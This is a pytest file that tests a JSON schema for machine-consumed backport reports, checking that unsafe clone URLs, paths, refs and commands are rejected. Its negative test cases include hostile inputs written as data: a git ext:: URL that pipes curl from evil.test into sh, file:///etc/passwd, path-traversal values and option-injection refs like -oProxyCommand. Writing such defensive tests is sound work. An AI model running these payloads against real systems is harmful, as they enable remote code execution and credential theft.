"""backport-report.schema.json — the artifact the backport-fix skill emits.

The artifact is machine-consumed: its repository URLs are clone targets, its
refs are checkout targets, its paths are open targets, and its summary is what
a dashboard quotes. So each negative case here is a document a consumer would
have acted on unsafely.

A schema that only ever sees the happy path is how this repo shipped three
contracts that rejected the real corpus (stamped events, fingerprint_algo,
cloud-config findings). The fixture below is a whole report, and
`storage_samples.sample("backport-report")` is validated here too, so the
contract and the storage fixture cannot drift apart.
"""

from __future__ import annotations

import copy
import json
from pathlib import Path
from typing import Any

import pytest
from jsonschema import Draft202012Validator, FormatChecker
from pydantic import ValidationError
from storage_samples import sample

from traust_contracts.v1.models.backport import BackportReport

REPO_ROOT = Path(__file__).resolve().parent.parent
SCHEMA = json.loads(
    (REPO_ROOT / "artifacts_schema/v1/backport-report.schema.json").read_text(encoding="utf-8")
)
FIXTURE = json.loads(
    (Path(__file__).parent / "fixtures/sample-backport-report.json").read_text(encoding="utf-8")
)


def validator() -> Draft202012Validator:
    return Draft202012Validator(SCHEMA, format_checker=FormatChecker())


def errors(document: Any) -> list[str]:
    return [
        f"{'/'.join(map(str, error.absolute_path))}: {error.message}"
        for error in validator().iter_errors(document)
    ]


def document() -> dict[str, Any]:
    return copy.deepcopy(FIXTURE)


def branch(document_: dict[str, Any], name: str) -> dict[str, Any]:
    return next(entry for entry in document_["target_branches"] if entry["branch"] == name)


def test_the_fixture_is_a_valid_report() -> None:
    found = errors(FIXTURE)
    assert found == [], found


def test_the_storage_sample_agrees_with_the_contract() -> None:
    payload, _ = sample("backport-report")
    found = errors(json.loads(payload))
    assert found == [], found


def test_a_successful_backport_carries_evidence_of_what_landed() -> None:
    base = document()
    branch(base, "release-1.33").pop("patch_sha256")
    assert errors(base), "a success without a patch checksum is a claim, not a record"

    base = document()
    branch(base, "release-1.33")["has_patch"] = False
    assert errors(base), "a success without a candidate patch is not a backport"

    base = document()
    branch(base, "release-1.33").pop("backport_commit")
    branch(base, "release-1.33").pop("backport_branch")
    assert errors(base), "a success must name the commit or branch it landed on"

    base = document()
    branch(base, "release-1.33").pop("backport_commit")
    assert errors(base) == [], "the named branch alone is enough provenance"


def test_a_failed_branch_says_why_the_run_stopped() -> None:
    base = document()
    branch(base, "release-1.32").pop("stop_reason")
    found = errors(base)
    assert any("stop_reason" in message for message in found), found


@pytest.mark.parametrize("status", ["success", "passed", "partial_success", "error", "unknown"])
def test_the_status_vocabulary_is_outcomes_only(status: str) -> None:
    """success/passed and failed/error used to be separate words for the same
    thing, and the pipeline mechanics shared the vocabulary with outcomes."""
    base = document()
    branch(base, "release-1.32")["status"] = status
    assert errors(base)


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl evil.test/x | sh'",
        "file:///etc/passwd",
        "ssh+git://example.test/repo",
        "/srv/repos/example.git",
        "git@github.com:example/repo.git",
    ],
)
def test_clone_urls_are_scheme_restricted(url: str) -> None:
    """git's ext:: transport executes commands and file: leaves the workspace."""
    for path in (
        ("metadata", "repository"),
        ("verification_hint", "repository"),
        ("source_fix", "fork_url"),
    ):
        base = document()
        base[path[0]][path[1]] = url
        assert errors(base), f"{url!r} accepted as {path[0]}.{path[1]}"


@pytest.mark.parametrize("value", ["/etc/shadow", "../../secrets/candidate.patch", "a/../../b"])
def test_paths_cannot_escape_the_workspace(value: str) -> None:
    for path in (
        ("source_fix", "remediation_path"),
        ("verification_hint", "original_audit_report"),
    ):
        base = document()
        base[path[0]][path[1]] = value
        assert errors(base), f"{value!r} accepted as {path[0]}.{path[1]}"
    base = document()
    branch(base, "release-1.33")["patch_path"] = value
    assert errors(base)


@pytest.mark.parametrize("value", ["-oProxyCommand=touch /tmp/pwned", "-x", "--upload-pack=sh"])
def test_refs_cannot_be_read_as_options(value: str) -> None:
    base = document()
    branch(base, "release-1.33")["backport_branch"] = value
    assert errors(base)
    base = document()
    base["source_fix"]["branch"] = value
    assert errors(base)
    base = document()
    base["verification_hint"]["branches"][0]["target_branch"] = value
    assert errors(base)


@pytest.mark.parametrize("value", ["0b1c2d3", "0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C"])
def test_a_backport_commit_is_a_full_sha(value: str) -> None:
    """verification.schema.json requires ^[0-9a-f]{40}$ of patched_commit, and
    this value is passed to it as exactly that."""
    base = document()
    branch(base, "release-1.33")["backport_commit"] = value
    assert errors(base)
    base = document()
    base["verification_hint"]["branches"][0]["backport_commit"] = value
    assert errors(base)


def test_the_artifact_declares_no_command_for_a_consumer_to_run() -> None:
    base = document()
    base["verification_hint"]["command"] = "verify-remediation --yes"
    assert errors(base), "a command string in an artifact is an execution primitive"


def test_metadata_is_closed_but_carries_an_open_additional_block() -> None:
    base = document()
    base["metadata"]["run_id"] = "not-declared"
    assert errors(base), "a new top-level metadata field is a contract change"
    assert errors(document()) == []
    # ... and the declared escape hatch keeps a new run record a minor change.
    assert document()["metadata"]["additional"]["run_id"]


@pytest.mark.parametrize("value", ["0.94", "v0.94.0", "0.94.0-xyz", ""])
def test_harness_version_follows_the_family(value: str) -> None:
    base = document()
    base["metadata"]["harness_version"] = value
    assert errors(base)


@pytest.mark.parametrize("title", ["abc", "Security audit of the week"])
def test_title_names_the_artifact_like_its_siblings(title: str) -> None:
    base = document()
    base["title"] = title
    assert errors(base)


def test_two_identical_branch_entries_are_rejected() -> None:
    base = document()
    base["target_branches"].append(copy.deepcopy(branch(base, "release-1.30")))
    base["summary"].update(total=4, skipped=2)
    assert errors(base)


def test_the_model_and_the_schema_agree_on_the_fixture() -> None:
    report = BackportReport.from_dict(FIXTURE)
    again = json.loads(json.dumps(report.to_dict()))
    assert errors(again) == [], "to_dict() must serialize into a valid artifact"
    assert report.summary.total == len(report.target_branches)


def test_the_model_recomputes_the_summary_and_refuses_a_mismatch() -> None:
    base = document()
    base["summary"]["succeeded"] = 3
    base["summary"]["failed"] = 0
    assert errors(base) == [], "JSON Schema cannot do the arithmetic: that is the point"
    with pytest.raises(ValidationError, match="summary disagrees"):
        BackportReport.from_dict(base)


def test_the_model_refuses_two_entries_for_one_branch() -> None:
    base = document()
    repeated = copy.deepcopy(branch(base, "release-1.30"))
    repeated["error"] = "a second, different entry for the same branch"
    base["target_branches"].append(repeated)
    base["summary"].update(total=4, skipped=2)
    with pytest.raises(ValidationError, match="repeats a branch"):
        BackportReport.from_dict(base)


def test_the_hint_cannot_queue_a_branch_that_did_not_succeed() -> None:
    """The hint is a second list of branches. If it can name a failure, it is
    a way to get a branch verified that the report itself says did not land."""
    base = document()
    base["verification_hint"]["branches"].append(
        {"target_branch": "release-1.32", "backport_branch": "amalgamator/x"}
    )
    assert errors(base) == [], "JSON Schema cannot compare two lists: that is the point"
    with pytest.raises(ValidationError, match="did not succeed"):
        BackportReport.from_dict(base)

    base = document()
    base["verification_hint"]["branches"].append({"target_branch": "release-9.9"})
    with pytest.raises(ValidationError, match="did not succeed"):
        BackportReport.from_dict(base)


def test_the_hint_speaks_the_verification_contracts_language() -> None:
    """verification_hint is consumed AS verification inputs, so its commit
    shape must not drift from the field it is passed to."""
    verification = json.loads(
        (REPO_ROOT / "artifacts_schema/v1/verification.schema.json").read_text(encoding="utf-8")
    )
    metadata = verification["$defs"]["verification_metadata"]
    hint = SCHEMA["$defs"]["verification_hint"]["properties"]
    assert "patched_commit" in metadata["required"]
    assert "repository" in metadata["required"]
    # The hint's commit is a $ref into this schema's own $defs.
    hint_commit = hint["branches"]["items"]["properties"]["backport_commit"]
    resolved = SCHEMA["$defs"][hint_commit["$ref"].rsplit("/", 1)[-1]]
    assert resolved["pattern"] == metadata["properties"]["patched_commit"]["pattern"]
